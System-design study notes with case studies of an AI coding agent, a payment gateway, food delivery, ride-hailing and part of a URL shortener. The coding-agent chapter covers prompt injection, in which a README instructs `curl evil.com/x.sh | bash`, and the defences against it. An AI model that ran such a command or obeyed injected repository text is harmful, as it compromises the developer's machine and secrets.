# Part VIII: Case Studies (Boss Battles)

**Topic:** System design
**Covers:** Case Study: An AI Coding Agent (Claude Code-style); Case Study: A Payment Gateway (Razorpay/Stripe-style); Case Study: Swiggy (Food Delivery); Case Study: Uber (Ride-Hailing); Case Study: A URL Shortener (bit.ly-style); Case Study: WhatsApp (Messaging); Case Study: YouTube (Video Platform); Case Study: A ChatGPT-Style AI Assistant
**Source:** [Claude artifact](https://claude.ai/artifact/7xxGdVxPGbUiPY13z4MdZ2) — written by a colleague, mirrored here for study.

## Chapter 53: Case Study: An AI Coding Agent (Claude Code-style)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Design an AI agent that reads a codebase, edits files, runs commands and tests, and finishes coding tasks safely for millions of developers. |
| Why it is hard | Code is private, shell access is dangerous, repos exceed context windows, each task needs dozens of model calls, and repos can contain malicious instructions. |
| How we solve it | Run tools on the developer's machine, a budgeted agent loop, agentic search with compaction, prompt caching, a permission engine plus sandbox, verification by running tests, and a scalable inference backend. |
| What fails, and why | Injected commands from a README (content treated as instructions), false "tests pass" (no verification), exploding token costs (no caching or context control), and wrong-directory deletes (no deny rules or sandbox). |

A developer types "fix the failing login test and add rate limiting to /auth"; the agent reads the codebase, edits files, runs tests and iterates until done, in a terminal, IDE, desktop app or remotely. This is an interview-style design from first principles, not Anthropic's internal architecture.

### 53.1 Requirements

Functional: natural-language tasks; explore (list, search, read); edit and create files; run commands, tests, builds and git; iterate; ask permission for risky actions; stream progress; remember project conventions; connect external tools via MCP; resume, undo, run remotely. Non-functional, in priority order: safety, privacy, low perceived latency, reliability over long tasks, cost efficiency, scale, correctness through verification.

### 53.2 Estimation

```
1M developers × 10 tasks × ~30 model calls = 300M calls/day ≈ 3,000/s avg, ~10,000/s peak
Input:  300M × 50K tokens = 15 trillion tokens/day
Output: 300M × 1K tokens  = 300 billion tokens/day
```

Input dominates, so prompt caching is essential; growing history needs compaction; per-call latency compounds over 30 calls; GPU inference is the bottleneck; code is local, so tools run on the client.

### 53.3 Architecture

```
┌─────────────── CLIENT (developer machine) ───────────────┐
│ CLI / IDE / desktop                                       │
│  AGENT LOOP: context manager · permission engine · tool executor │
│  (read, grep, edit, bash, MCP clients)                    │
│  local: transcripts, checkpoints (undo), project memory   │
└───────────────────────────┬───────────────────────────────┘
                            │ HTTPS + SSE streaming
┌─────────────── BACKEND ───┼───────────────────────────────┐
│ API gateway (auth, org policy, rate limits, quotas)       │
│ LLM inference cluster (prompt cache, batching, routing)   │
│ usage & billing (Kafka) · telemetry                       │
│ optional: remote execution sandboxes · session relay      │
└───────────────────────────────────────────────────────────┘
```

Running tools on the client keeps the repo local (privacy), keeps the backend stateless, and uses the developer's real environment.

### 53.4 Deep dives

The agent loop: the model returns text (done) or tool calls; each passes a permission check, runs locally, and its result is appended. Tools: glob/ls, grep, read\_file (read-only); edit\_file and write\_file (modify); bash (anything); web fetch and search (untrusted); MCP tools. Controls: step and token budgets, repeated-failure detection, instant interrupts, parallel calls. Targeted edits (`old_text → new_text`, matching exactly once) cost fewer output tokens than rewriting files, are precise and reviewable as diffs; mismatches return errors so the model re-reads. Verification runs tests, linters, type-checkers and builds.

Context management: agentic search (grep, glob, read) is always fresh, private and exact on identifiers; an embedding index helps vague queries but goes stale. Read line ranges, truncate huge outputs, compact old turns into summaries, use sub-agents with fresh contexts for broad exploration, and load a project memory file of conventions. Prompt caching reuses the stable prefix (system prompt, tools, memory, earlier history); keep that prefix stable and route a session to replicas holding its cache.

Safety: reads allowed; edits ask (or accept-edits mode); test commands ask once then allowlist; destructive commands ask every time or are blocked; credential files denied; org policy overrides users. Sandboxing restricts writable folders and network domains; cloud tasks use disposable VMs. Injection defense treats tool results as data, requires approval for sensitive actions, blocks exfiltration domains and flags suspicious instructions. Checkpoints allow rewind; secrets are redacted; audit logs record commands.

Inference backend: gateway rate limits on requests and tokens per minute; routing big versus small models; continuous batching; KV cache eviction; overload errors with client backoff and priority load shedding; SSE streaming with retries that are safe because tool execution happens client-side afterward.

Sessions: local append-only transcripts replayed to resume. Remote tasks: task API → queue → sandbox orchestrator → container clones the repo → agent runs → branch or PR; scoped short-lived credentials; checkpoints and heartbeats for long tasks. Mobile control uses a session relay over WebSocket or SSE keyed by session ID.

Extensibility: MCP servers through the same permission engine, tool definitions loaded on demand, hooks (auto-format after edits, block edits to production config), custom commands and skills. Observability: TTFT, tokens/s, overload rates, steps per task, tool errors, denials, interrupts, cache hit rate, traces; offline benchmarks in sandboxed repos with hidden tests, safety regression suites, A/B tests and canaries.

### 53.5 Failure scenarios and fixes

| Scenario | Fix |
| --- | --- |
| README instructs `curl evil.com/x.sh \| bash` | Data-not-instructions; command needs approval or is blocked; sandbox egress blocks the domain |
| Agent claims tests pass without running them | Verification hook runs tests before accepting |
| Context overflow mid-task | Compaction, sub-agents, line-range reads |
| Token costs exploding | Prompt caching, context trimming, model routing, targeted edits |
| `rm -rf` on wrong directory | Deny rules, sandbox write scope, checkpoints |
| Inference overload | Backoff with jitter, priority shedding, clear status |
| Stream drops mid-response | Retry the model call; tools run only after full responses |

### 53.6 Trade-offs

| Decision | Gain | Cost |
| --- | --- | --- |
| Tools on the client | Privacy, stateless backend | Depends on local environment |
| Agentic search | Fresh, exact | More calls and tokens |
| Targeted edits | Cheap, reviewable | Retries on mismatch |
| Ask-by-default + sandbox + undo | Safety | Permission prompts (mitigated by allowlists) |
| Compaction + sub-agents + caching | Long tasks | Summaries may drop details |
| Model routing | Cost | Misrouting risk |

### 53.7 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Faster development, automated toil, consistent conventions |
| Constraints | Repo size vs context, environment differences, safety of shell access |
| Trade-offs | Autonomy vs review burden; local execution privacy vs cloud convenience |
| Use when | Well-tested repos where verification is cheap |
| Be careful when | No tests, production credentials on the machine, untrusted repos |

```
Typical task timeline
 read (5 calls) → plan → edit (3 calls) → test (fail) → fix (2 calls) → test (pass) → summary
 ~12 model calls · prefix cache hit ~90% after call 1 · 2 approvals requested
```

### Review questions

1. Give two reasons tools run on the developer's machine.
2. Name two layers that stop a malicious README command.
3. Name two techniques that cut token cost.

#### Answers

1. Privacy (the repo never uploads; only needed snippets reach the model) and a stateless, scalable backend (servers do not store or sync millions of repos); also, commands run in the developer's real environment.
2. Treating tool results as data, not instructions; the permission engine requiring approval or blocking `curl ... | bash`; and sandbox egress rules blocking unknown domains.
3. Prompt caching of the stable prefix; context management (compaction, line-range reads, output truncation, sub-agents); routing side tasks to small models; targeted edits instead of rewriting files.

## Chapter 54: Case Study: A Payment Gateway (Razorpay/Stripe-style)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Move money between customers, banks and merchants correctly, securely and at high success rates. |
| Why it is hard | Banks time out with unknown outcomes, retries risk double charges, card data is a prime target, and every paisa must reconcile across systems. |
| How we solve it | Idempotency keys, a strict payment state machine, PENDING handling with status polling and reconciliation, a double-entry ledger, an isolated card vault, smart routing, and signed webhooks. |
| What fails, and why | "Money deducted, order failed" (timeouts treated as failures), double charges (retries without idempotency), paisa drift (floats for money), and PCI breaches (card data in logs). |

Money cannot be eventually right. Most companies integrate an existing gateway; running one requires regulatory authorization (in India, payment aggregators need RBI authorization), bank partnerships, card-network and PCI DSS certification. This chapter designs one for learning and is not legal advice.

### 54.1 The money world

| Player | Role |
| --- | --- |
| Customer | Pays |
| Merchant | Gets paid (e.g. Swiggy) |
| Gateway / aggregator | Collects details securely, routes, settles to merchants |
| Acquiring bank | Merchant-side bank processing cards |
| Card network | Connects acquirers and issuers (Visa, Mastercard, RuPay) |
| Issuing bank | Customer's bank; approves or declines |
| NPCI / UPI | Runs UPI rails between banks and apps |

```
INFO FLOW (seconds):  customer → gateway → acquirer → network → issuer → "approved" → back
MONEY FLOW (~T+1):    issuer → network settlement → acquirer → gateway account → merchant
```

Card flow: hosted checkout sends card data straight to the gateway; tokenize and risk-check; 3-D Secure or OTP (required for most online card payments in India); authorize through acquirer, network and issuer, reserving funds; capture immediately or later; batch clearing and settlement; payout to the merchant minus fees. UPI flow: create a request; intent flow opens the customer's UPI app (or a collect request to a UPI ID); the customer enters the PIN in their own app; the bank debits via NPCI; the gateway learns the result by callback or polling. Vocabulary: authorize, capture, void, refund, settlement, chargeback, MDR.

### 54.2 Requirements and estimation

Functional: payments by cards, UPI, net banking and wallets; authorize, capture, void, full and partial refunds; webhooks and status APIs; scheduled settlements with reports; dashboards; fraud checks; disputes. Non-functional priority: correctness, security and compliance, auditability, high availability (99.99%+ on the payment path), low added latency, scalability for 5-10x sale spikes. Correct beats available beats fast; payments and balances are CP.

50M transactions/day ≈ 500 TPS average, \~2,500 peak; \~10 KB of records and events each ≈ 500 GB/day ≈ 180 TB/year; 50-150M webhooks/day. Throughput is modest; correctness under failure is the hard part.

### 54.3 API rules

`POST /v1/payments` with a required Idempotency-Key, amounts as integers in paise (`50000` = ₹500) with currency, never floats (0.1 + 0.2 ≠ 0.3); capture and refund endpoints (refunds also idempotent); status GET; webhooks such as payment.captured and refund.processed; separate test and live keys.

### 54.4 Architecture

```
Customer (hosted checkout)      Merchant servers (secret key)
        └──────────► API GATEWAY / EDGE (TLS, auth, rate limits, WAF) ◄──────────┘
                              │
                      PAYMENT SERVICE (state machine, idempotency, DB + outbox)
        ┌──────────┬──────────┼──────────────┬──────────────┐
   Risk/fraud   Token vault   Smart router    LEDGER        Kafka (via outbox)
                (PCI, HSM)     │             (double-entry)   ├─► webhooks → merchants
                         CONNECTORS                           ├─► analytics, notifications
                         acquirer A, B · UPI · net banking · wallets
                              │
              SETTLEMENT & RECONCILIATION (batch: bank files ↔ ledger, payouts, breaks)
```

### 54.5 Deep dives

State machine: CREATED → AUTHENTICATING → AUTHORIZED → CAPTURED → SETTLED, with FAILED, PENDING (unknown), VOIDED and REFUND states. Only legal transitions, via conditional updates with versions (`UPDATE payments SET status='CAPTURED', version=version+1 WHERE id=? AND status='AUTHORIZED' AND version=7`); every transition recorded as an event.

Idempotency: insert the key with `UNIQUE(merchant_id, key)` and a request hash in one transaction; a retry with the same hash returns the saved response; a different hash is rejected. Pass unique references to banks; publish via outbox; all consumers idempotent.

Unknown outcomes: a bank timeout means the money may be gone. Never mark it failed, never blindly retry; mark PENDING, poll the bank's status API with the unique reference, and let reconciliation confirm or auto-refund. Payments have three outcomes: success, failure and unknown.

Ledger: double-entry, append-only, balances derived. A ₹500 payment with a 2% fee: debit customer funds receivable ₹500; credit merchant payable ₹490; credit fee revenue ₹10; debits equal credits. For ₹1,000 with a ₹20 fee: 1,000 = 980 + 20. Errors are fixed by new correcting entries; writes are strongly consistent with synchronous replication; imbalance triggers alarms.

Card security: minimize PCI scope with a tiny isolated token vault; hosted fields send card numbers directly to it; RBI's card-on-file tokenization (since 2022) means merchants cannot store raw card numbers; HSMs hold keys; never store CVV after authorization; never touch UPI PINs or OTPs; mask cards in logs.

Smart routing: track success rate and latency per acquirer × network × issuer × method × time; route to the likeliest path; circuit-break degraded routes; reroute only technical failures, never genuine declines, and only when duplicate-safe.

Fraud: inline rules (velocity, blocklists, amounts, geography) plus ML scores within tens of milliseconds; fall back to rules if ML is down; balance precision and recall.

Webhooks: HMAC-signed, at-least-once with backoff for hours or days, DLQ with replay, no ordering guarantee (include versions; tell merchants to fetch status), asynchronous from Kafka, plus a status API.

Settlement and reconciliation: daily jobs match ledger, acquirer files and bank statements to the paisa; breaks (in ledger not bank, bank not ledger, amount mismatches, duplicates) go to an ops queue with aging alerts; payouts compute captured − refunds − fees − chargebacks − reserves with idempotent transfers.

Storage: sharded PostgreSQL by merchant (watch hot merchants); ledger with synchronous replication; idempotency in the DB with a Redis cache; vault isolated; Kafka; warehouse; append-only audit logs.

### 54.6 Failure scenarios and fixes

| Scenario | Symptom | Fix |
| --- | --- | --- |
| Bank authorization timeout | "Money deducted, order failed" | PENDING + status polling + reconciliation + auto-refund |
| Merchant retries create | Possible double charge | Idempotency key with unique constraint |
| Webhook delivered twice or out of order | Merchant ships twice | Signed, versioned events; merchants idempotent; status API |
| Acquirer degraded on IPL night | Success rate drops | Circuit breaker, reroute to backup acquirer |
| Ledger imbalance | Books do not balance | Automated audits, alarms, correcting entries |
| Float rounding | Paisa drift over millions of payments | Integer paise |
| Card data in logs | PCI breach | Vault isolation, masking, log scanning |
| Fraud ML outage | Approve-all or block-all risk | Rule-based fallback |

### 54.7 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Correct money movement, high success rates, merchant trust |
| Constraints | Regulation, PCI scope, bank dependencies, reconciliation workload |
| Trade-offs | Strong consistency (correct) vs availability; smart routing (success) vs complexity |
| Build when | You are a payments company with licenses and partnerships |
| Integrate when | You are a merchant (almost always) |
| Avoid | Floats for money, blind retries, storing card numbers |

```
Daily reconciliation snapshot
 ledger captured: ₹4,82,10,500 · acquirer file: ₹4,82,09,800 · breaks: 3 (₹700)
 → 2 pending confirmations auto-resolved · 1 duplicate refund flagged to ops
```

### Review questions

1. Why must a timeout be neither marked failed nor retried? What instead?
2. Why store amounts as integers in paise?
3. Write the ledger entries for ₹1,000 with a ₹20 fee.

#### Answers

1. A timeout means the outcome is unknown: the bank may have approved and debited. Marking it failed could leave the customer charged without an order; retrying could charge twice. Mark it PENDING, poll the bank's status API with the unique reference, and let reconciliation confirm it or auto-refund.
2. Floating-point numbers cannot represent many decimals exactly (0.1 + 0.2 ≠ 0.3), so rounding errors accumulate over millions of transactions; integers in paise are exact.
3. Debit customer funds receivable ₹1,000; credit merchant payable ₹980; credit fee revenue ₹20. Debits equal credits (1,000 = 980 + 20).

## Chapter 55: Case Study: Swiggy (Food Delivery)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Connect customers, restaurants and riders so food is ordered, paid, cooked, picked up and delivered fast, at dinner-rush scale. |
| Why it is hard | Three sides behave differently, riders send tens of thousands of GPS updates per second, payments must be exact, and IPL nights multiply load. |
| How we solve it | Cached geo-based discovery, server-side cart validation, an orchestrated order saga with outbox events, batched zone dispatch, a Kafka location pipeline, ML ETAs, and priority load shedding. |
| What fails, and why | Orders database melting (GPS written to it), riders sent far too early (greedy nearest-rider dispatch), oversold coupons (non-atomic counters), and outages on match nights (no pre-scaling or shedding). |

A three-sided marketplace of customers, restaurants and riders. This is a Swiggy-like design from first principles, not Swiggy's internal architecture.

### 55.1 Requirements and consistency per feature

In scope: discovery, menus, cart, checkout and payment, order lifecycle, restaurant acceptance, rider assignment, live tracking, ETA, notifications, ratings, support. Out: Instamart, Dineout, Genie, ads.

| Feature | Consistency |
| --- | --- |
| Payments, order placement, coupon limits | Strong |
| Rider-order assignment | Strong (one rider per order) |
| Order status | Causal / read-your-writes |
| Browse, menus, search | Eventual |
| Rider location | Eventual |
| Ratings | Eventual |

### 55.2 Estimation

```
Browse:   10M DAU × 30 = 300M/day → ~3,500/s avg → peak 15-20K/s
Orders:   3M/day; dinner hour 20% → ~170/s → IPL spike ~500/s
GPS:      300K riders ÷ 4 s ≈ 75,000 writes/s (~650 GB/day raw)
Tracking: ~170 orders/s × ~35 min ≈ 360,000 orders in flight
Storage:  3M × 5 KB ≈ 15 GB/day ≈ 5.5 TB/year
```

The scariest feature (orders) is low-volume; the highest-volume path is rider GPS, which would melt the orders database.

### 55.3 Architecture

```
Customer app      Restaurant app      Rider app
      └──► CDN (images, WAF) ──► LB ──► API gateway + BFFs (JWT, rate limits)
 DISCOVERY: search & listing · catalog/menu · recommendations
 ORDERING:  cart (Redis) · pricing & offers · ORDER SERVICE (state machine + saga) · payments → external gateways
 FULFILLMENT: dispatch · location service · ETA (ML) · tracking gateway (WebSockets)
 SUPPORT: users · restaurant ops · notifications · ratings · support bot · fraud
                          │
                Kafka (order events, locations, outbox, CDC)
 Data: PostgreSQL · Elasticsearch · Redis · Cassandra · S3 · lake/warehouse · feature store
```

Microservices because location ingestion, browsing and payments scale completely differently and hundreds of engineers work in parallel; a startup would begin with a modular monolith.

### 55.4 Deep dives

Discovery: hexagonal (H3-style) or geohash cells; restaurants have serviceable areas that shrink when riders are scarce (rain); Elasticsearch handles typo-tolerant text plus geo filters ("panner tika"); per-cell results cached in Redis for 30-60 seconds; ranking via the recommendation funnel. Slight staleness is fine because checkout validates.

Menus: nested documents; Redis cache; images on S3 and CDN with versioned URLs; sold-out toggles invalidate caches within seconds through events. Cart: Redis by user with TTL; recompute prices, availability, fees and offers at checkout, never trusting client totals. Pricing: item totals, packaging, dynamic delivery fee, taxes, discounts; coupon budgets with atomic counters (Redis `DECR` or constrained rows) to prevent overselling.

Order saga, orchestrated by a durable workflow engine with timers:

| Step | Action | Compensation |
| --- | --- | --- |
| 1 | Validate cart, reserve coupon | Release coupon |
| 2 | Create order (PAYMENT\_PENDING) | Cancel |
| 3 | Payment succeeds (webhook) | Refund |
| 4 | Restaurant accepts (timer) | Cancel + refund + notify |
| 5 | Dispatch | Release rider |

States: CREATED → PAYMENT\_PENDING → CONFIRMED → ACCEPTED → PREPARING → READY → RIDER\_ASSIGNED → PICKED\_UP → DELIVERED, or CANCELLED with compensations. PostgreSQL sharded by order ID with idempotency keys and an outbox; CQRS read models by user, restaurant and rider.

Payments: integrate two or more gateways with signature-verified webhooks, status polling for pending, reconciliation and auto-refunds. Restaurants receive WebSocket and push alerts; no acceptance within N minutes triggers an IVR call, then auto-cancel and refund.

Dispatch: nearest-free-rider greedy assignment can steal the only rider near another restaurant or send riders far too early. Instead, partition by zone; every few seconds batch pending orders and available riders and solve an assignment that minimizes total delivery and idle time; target just-in-time arrival using predicted prep time; batch two nearby orders per rider; claim riders atomically with compare-and-set or leases; reassign on reject or timeout.

Location pipeline:

```
Rider app (GPS every ~4 s, batched, offline buffering)
 → ingestion (stateless) → Kafka "rider-locations" (partitioned by rider_id)
    ├─► Redis: latest location + geo index (TTL)
    ├─► tracking gateway → customers watching that order (WebSocket/SSE)
    ├─► ETA service
    └─► Cassandra / object storage: downsampled history
```

ETA = accept + prep + rider-to-restaurant + wait + travel + last mile, with ML per component, real-time features (restaurant queue, weather, traffic, IPL flags), lifecycle updates, heuristic fallback and drift monitoring. Notifications are event-driven with dedupe, priority, rate limits and quiet hours. Ratings are async with moderation; the support bot uses RAG and tools with identity from the session and limits in code.

### 55.5 Peaks, failures and security

Pre-scale for dinner, matches and sales; auto-scale stateless tiers and consumers on Kafka lag; cache browsing; shed recommendations and reviews first while protecting order, payment, dispatch and tracking; rate limit bots; shrink serviceability when riders are scarce.

| Failure | Response |
| --- | --- |
| Payment gateway degraded | Circuit breaker → backup gateway; UPI banner |
| Recommendations down | Cached popular lists |
| Zone dispatcher crash | Only that zone affected; failover |
| Rider offline in a tunnel | Local buffering; ETA from last known plus prediction |
| Restaurant tablet offline | Push, then IVR call, then auto-cancel with refund |
| Kafka consumer lag | Alerts, scale consumers; non-critical consumers lag |
| DB leader failure | Failover to synchronous replica |
| Region issue | Multi-AZ; failover readiness |

Security: ownership checks on orders and tracking, phone masking through virtual numbers, address shown only after pickup, PII masking, audited location access, fraud detection for coupon farming, GPS spoofing and refund abuse. Observe business metrics per city per minute: orders, payment success, acceptance, assignment time, ETA error, cancellations.

### 55.6 Evolution

Day one: modular monolith, PostgreSQL, Redis, one gateway, nearest-rider dispatch, polling. Growth: Elasticsearch, CDN, Kafka, WebSockets, read replicas; split location and dispatch first. Scale: full microservices, zone batch dispatch, ML ETAs, multi-gateway routing, regional cells, load shedding.

### 55.7 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits of this design | Fast discovery, correct payments, efficient dispatch, live tracking at scale |
| Constraints | Rider supply, restaurant reliability, monsoon/traffic, peak dinner load |
| Trade-offs | Batch dispatch delay vs global efficiency; per-cell caching staleness vs speed |
| Microservices when | Many teams, divergent scaling (location vs catalog) |
| Monolith when | Early city launch with a small team |

```
IPL night timeline
19:00 pre-scale ×3 · 19:30 toss → browse 4x · 21:00 innings break → orders 3x
21:05 gateway A degrades → breaker → gateway B · 23:30 match ends → scale down gradually
```

### Review questions

1. Why not store GPS in the orders PostgreSQL? Two reasons.
2. Why batch dispatch instead of instant nearest-rider assignment?
3. In IPL overload, which two features degrade first and which two are protected?

#### Answers

1. About 75,000 GPS writes per second of tiny, constantly overwritten data would overwhelm a transactional database sized for \~500 orders/s; and location data needs only the latest value, tolerates staleness and can be downsampled, which fits Redis, Kafka and Cassandra better than ACID tables.
2. Greedy nearest-rider assignment is locally good but globally bad: it can steal the only rider near another restaurant or send riders far too early. Batching a few seconds lets an optimizer minimize total delivery and idle time.
3. Degrade first: personalized recommendations (fall back to popular) and reviews or loyalty updates (queue them). Protect: order placement with payments, and dispatch with tracking.

## Chapter 56: Case Study: Uber (Ride-Hailing)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Match a waiting rider with a nearby driver in seconds, price the ride fairly, and track and pay for the trip safely. |
| Why it is hard | Both sides move, location is on the critical path for quotes and matching, demand spikes locally, and riders' physical safety is at stake. |
| How we solve it | An in-memory H3 geospatial index, matching by road ETA with atomic claims, per-cell smoothed surge, server-issued quotes, durable trip workflows, payment holds, and regional failover. |
| What fails, and why | Two drivers on one trip (non-atomic claims), slow pickups (ranking by straight-line distance), tampered fares (client-sent prices), and flickering surge (no smoothing). |

Both sides move, a rider is standing on a street waiting, and price changes with demand in real time. This is an Uber-like design; where Uber has shared things publicly (H3, Cadence), the text says so.

### 56.1 Requirements

Rider sets pickup and drop, sees ETA and an upfront fare per product, requests; a driver is offered and accepts; both track each other; trip starts with a PIN, ends, is paid and rated; drivers go online, accept offers and get paid; safety features. Strong consistency for driver-trip assignment, accepted quotes, payments and trip state; eventual for locations, surge maps, ratings and history. Availability is a safety issue: a stranded rider at night is not just lost revenue.

### 56.2 Estimation

```
Requests: 20M trips/day; busiest hour 10% → ~555/s; spikes ~1,700/s
Quotes:   ~3 per trip → ~1,700/s peak, spikes ~5,000/s
GPS:      1.5M online drivers ÷ 4 s ≈ 375,000 updates/s (~3 TB/day raw)
In flight: ~555/s × 1,200 s ≈ 670,000 concurrent trips (two apps each)
```

Location is on the critical path for quotes, matching and pricing, so the index must answer "who is near?" in milliseconds.

### 56.3 Architecture

```
Rider app                                            Driver app
   └► edge (GeoDNS → nearest region, WAF)              └► driver connection gateway
   └► API gateway / rider BFF                              (persistent connections)
 PRICING & QUOTES ◄── SURGE (per-cell multipliers)
 DISPATCH / MATCHING (sharded by city/region) ◄─► LOCATION SERVICE (in-memory index by H3 cell)
 MAPS: routing + ETA (road graph + live traffic + ML)
 TRIP SERVICE (state machine + workflow timers)
 PAYMENTS (auth hold → capture) · ledger · payouts
 SAFETY · FRAUD · RATINGS · NOTIFICATIONS · NUMBER MASKING
 Kafka (locations, trip events, pricing signals, outbox)
 Trip DB (sharded, strong) · Redis · Cassandra · lake · feature store
```

### 56.4 Deep dives

Geospatial index: Uber open-sourced H3, a hierarchical hexagonal grid. Hexagons' six neighbors are equidistant (squares have farther diagonals), making ring searches clean at multiple resolutions. An in-memory index maps cell to available drivers and driver to latest state with TTLs; nearby search expands rings (k-rings); shards by geography; updates arrive through Kafka partitioned by driver. Airports and stadiums create hot cells: use finer cells, split shards, add replicas.

Matching: candidates from nearby rings with the right vehicle type; rank by road ETA (a driver 500 m away across a river may be 15 minutes away), include soon-free drivers finishing nearby trips, acceptance likelihood and fairness; batch requests for a few seconds in dense areas; offer to one driver at a time with a \~15-second timeout to avoid accept races; claim atomically (AVAILABLE → DISPATCHED only if still available). Dispatch shards by geography with consistent hashing, which Uber has publicly described using.

Routing and ETA: a road graph with preprocessing such as contraction hierarchies for millisecond queries; live traffic from drivers' own GPS traces; an ML correction layer (time, weather, events, pickup difficulty); caches of popular cell pairs; fallback to cached matrices or straight-line estimates.

Pricing: fare = (base + per-km × distance + per-minute × time) × surge + fees. Surge per H3 cell every \~minute from demand (requests, app opens) versus supply (available plus soon-available drivers), smoothed across neighbors and time, capped by rules, published as driver heat maps. Quotes get an ID, exact fare and expiry, stored or signed server-side; requests carry only the quote ID so a tampered app cannot send ₹1.

Trip lifecycle: REQUESTED → MATCHING → DRIVER\_ASSIGNED → DRIVER\_ARRIVING → DRIVER\_ARRIVED → IN\_PROGRESS (after PIN) → COMPLETED → PAID, with rider or driver cancellation, no-show and no-drivers exits. Durable workflow timers handle offer timeouts, no-driver notices, no-show fees and long-stationary safety checks; Uber created the Cadence workflow engine from which Temporal later grew.

Payments: authorize a hold at request; capture the final fare; tips as separate charges; a ledger for every split; weekly or instant payouts; cash markets track commission owed by drivers. Real-time communication: persistent connections, offline GPS buffering, idempotent client actions, acknowledged offers, push or SMS fallbacks, backoff with jitter on reconnect.

Global scale: city-local regional deployments with cells, data residency, client-assisted rebuild of in-flight trips after regional failover, and statically provisioned spare capacity. Safety: trip sharing, SOS, anomaly detection (long stops, route deviation), PINs, driver verification, number masking. Fraud: GPS spoofing, rider-driver collusion found through graph analysis, payment fraud scores, promo abuse.

### 56.5 Failure scenarios and fixes

| Failure | Response |
| --- | --- |
| Routing slow | Cached ETA matrices or straight-line fallback |
| Pricing down | Last known multipliers or base fares with caps |
| Dispatch shard crash | Consistent hashing reassigns area; idempotent retries |
| Location shard lost | Rebuilt within seconds from fresh updates (data is ephemeral) |
| Payment provider down | Retry authorization later; backup provider |
| Driver offline | Local buffering, idempotent actions, reconcile on reconnect |
| Region outage | Fail over cities; clients help rebuild trips |
| Two drivers accept one trip | Atomic conditional claim |
| Surge flicker across a street | Spatial and temporal smoothing |

| Aspect | Swiggy | Uber |
| --- | --- | --- |
| Fixed point | Restaurant | Both sides move |
| Time pressure | Prep time buffer | Rider waiting |
| Matching goal | Arrive when food is ready | Minimize pickup ETA |
| Location role | Tracking + dispatch | Critical path for quotes, matching, pricing |
| GPS volume (assumed) | \~75K/s | \~375K/s |
| Pricing | Menus + delivery fee | Per-cell real-time surge |
| Safety stakes | Food and delivery | Personal physical safety |

### 56.6 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Fast matching, fair dynamic pricing, global resilience, rider safety |
| Constraints | Supply-demand imbalance, GPS noise, regulation of surge, flaky networks |
| Trade-offs | Sequential offers (clean UX) vs speed; surge (availability) vs perceived fairness |
| Batch matching when | Dense areas with many simultaneous requests |
| Immediate matching when | Sparse areas |

```
Airport surge example
 flight lands → 300 requests in 10 min at cell 8a61… · 40 drivers nearby
 surge 1.8x (smoothed, capped) → heat map pulls drivers → 25 min later surge back to 1.1x
```

### Review questions

1. Why rank by road ETA rather than straight-line distance?
2. Why is losing a location shard acceptable but not losing trip or payment data?
3. Why accept a server-issued quote ID instead of a client-sent price?

#### Answers

1. Riders care about time, not distance: a driver 500 m away across a river or on a one-way flyover may need 15 minutes, while one 2 km away on the same road needs 4.
2. Location data is ephemeral and self-healing: drivers resend positions every \~4 seconds, so a lost shard rebuilds almost instantly. Trips and payments are facts that cannot be regenerated; losing them means lost money and wrong fares.
3. Prices must be computed and controlled by the server; a modified app could send ₹1. A server-issued, expiring, stored or signed quote locks the exact agreed price.

## Chapter 57: Case Study: A URL Shortener (bit.ly-style)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Turn long URLs into short codes that redirect instantly, forever, for billions of clicks. |
| Why it is hard | Codes must be unique and unguessable without a global bottleneck, reads outnumber writes 100 to 1, viral links create hot keys, and links get abused for phishing. |
| How we solve it | Range-allocated, scrambled base62 IDs; a key-value store partitioned by code; Redis and edge caching; 302 redirects; asynchronous click analytics; safety scanning and rate limits. |
| What fails, and why | Creation bottleneck (single global counter), enumerated private links (sequential codes), database stampedes (viral link cache expiry), and slow redirects (synchronous click counting). |

Simple on the surface, it tests ID generation, read-heavy scaling, caching and asynchronous analytics. Redirect availability is the top priority: short links live in tweets, posters and QR codes forever.

### 57.1 Requirements and estimation

Create links (optional custom alias and expiry), redirect, show click analytics, delete or disable. Redirects must be very fast and highly available; reads dominate; codes unique and hard to guess; analytics may lag.

```
Writes:  100M links/day → ~1,000-1,200/s
Reads:   100 redirects/link → 10B/day → ~115,000/s avg → ~300,000/s peak
Storage: ~500 B/link → 50 GB/day → ~18 TB/year → ~90 TB over 5 years
Codes:   182.5B links in 5 years; 62^6 ≈ 56.8B too few; 62^7 ≈ 3.5T → 7 base62 characters
```

### 57.2 APIs and 301 vs 302

`POST /v1/links`, `GET /{code}` → 302 (404 or 410 if expired), `GET /v1/links/{code}/stats`, `DELETE /v1/links/{code}`. 301 may be cached by browsers indefinitely, hiding repeat clicks and blocking edits or takedowns; 302 sends every click through the service, enabling analytics, edits and instant disabling of phishing links. Choose 302 and absorb load with caching.

### 57.3 Architecture

```
Click → GeoDNS/Anycast → CDN/edge (DDoS; brief hot-link caching) → LB
 → REDIRECT SERVICE (stateless)
     1 Redis lookup → hit → 302 (~1 ms)
     2 miss → KV store (partitioned by code) → fill cache → 302
     3 fire-and-forget click event → Kafka → stream aggregation → OLAP → stats API
 CREATE SERVICE (separate, rate-limited): validate & safety-scan → generate code → conditional write
```

Create and redirect are separate because redirects are \~100x more frequent, latency-critical, and must survive creation problems.

### 57.4 Code generation

| Option | Pros | Cons |
| --- | --- | --- |
| Hash of URL, truncated | Natural dedup | Collisions to resolve; awkward shared analytics |
| Random 7 chars + uniqueness check | Unpredictable, simple | Conditional write per create; rare retries |
| Counter + base62 with range allocation and scrambling | Guaranteed unique, no per-request coordination | Gaps when servers die (harmless) |

A single global counter is a bottleneck, a single point of failure and slow across regions; range allocation hands each server a block (5,000,000-5,999,999) from a strongly consistent coordinator. Sequential codes are guessable and allow enumeration of private links, so scramble IDs with a keyed reversible permutation before encoding. Custom aliases use conditional inserts and a reserved-word list.

### 57.5 Storage, caching and analytics

